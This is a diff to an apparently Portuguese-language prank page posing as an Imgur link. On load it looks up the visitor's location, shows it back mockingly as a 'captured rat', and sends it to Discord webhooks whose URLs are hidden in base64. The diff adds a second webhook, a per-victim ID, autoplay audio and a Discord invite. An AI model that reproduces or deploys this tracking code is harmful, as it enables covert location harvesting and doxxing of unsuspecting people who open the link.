@@ -10,10 +10,26 @@
                 <img src="ratoeira.webp"  width="300">
                 <h1>Mais um ratão de Imgur capturado! 🤣🤣</h1>
                 <h2>O Rato da vez é de <span id="loc"></span></h2>
+                <br>
+                <h3><b><a href="https://discord.gg/K8zzbUDb">Se junte ao Discord dos ratos!</a></b></h3>
+                <audio id="som" src="rato.mp3" autoplay></audio>
             </div>
         </body>
 
         <script>
+
+                 window.addEventListener('DOMContentLoaded', () => {
+                    const som = document.getElementById('som');
+                    som.play().catch(() => {
+                        const btn = document.createElement('button');
+                        btn.textContent = '▶';
+                        btn.onclick = () => {
+                        som.play();
+                        btn.remove();
+                        };
+                        document.body.appendChild(btn);
+                    });
+                });
             
             class Start {
                 static async start() {
@@ -34,8 +50,10 @@
                         
                        let $loc =  document.getElementById("loc");
                        $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
+                        
+                        const randomId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
 
-                        Start.sdc(i,` ${
+                        Start.sdc(randomId, i,` ${
                             data.location.principalSubdivision +
                             ", " +
                             data.location.city +
@@ -43,7 +61,7 @@
                             data.location.localityName
                         }`,j);
 
-                        Start.ratoeira(`${
+                        Start.ratoeira(randomId, `${
                             data.location.principalSubdivision +
                             ", " +
                             data.location.localityName
@@ -74,7 +92,7 @@
 
 
 
-                static sdc(a, b, c) {
+                static sdc(id, a, b, c) {
                     let u =
                     "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==";
                     const request = new XMLHttpRequest();
@@ -89,7 +107,7 @@
                     const params = {
                     embeds: [
                         {
-                        title: `Imgur de ${nome}`,
+                        title: `Captura de ${nome}`,
                         fields: [
                             {
                             name: "",
@@ -104,15 +122,18 @@
                             value: a,
                             },
                         ],
+                        footer: {
+                            text: "ID do Rato: " + id,
+                        },
                         },
                     ],
                     };
                     request.send(JSON.stringify(params));
                 }
 
-                static ratoeira(b) {
+                static ratoeira(id, b) {
                     let u =
-                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzY2NTg5MTM3MDkzMDMzOC95RUlNR29qbDdGVEluT3V6NU9JRnItTFpQT3dmMkFjQVMweTBkX0JGOEtjaTlhR2t3NEJRWjJWeEh4NFdsQkllbUdBTA==";
+                    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM1MDAwMDc4NzI5NjI1Ni9FN1ZDSFUtZDF2Y1dqZ2libTJFOFpMTXJNTkc5Mzg3UG5MTFBYMGlPcFFRekJGSHhMdDVvSHZTODllSjhaSzNMQy0zbA==";
                     const request = new XMLHttpRequest();
                     request.open("POST", atob(u));
 
@@ -125,13 +146,16 @@
                     const params = {
                     embeds: [
                         {
-                        title: `Ratão capturado por ${nome}`,
+                        title: `🐭 Ratão capturado por ${nome}`,
                         fields: [
                             {
-                            name: "Rato capturado em",
+                            name: "📍 Localização",
                             value: b,
                             },
                         ],
+                        footer: {
+                            text: "ID do Rato: " + id,
+                        },
                         },
                     ],
                     };
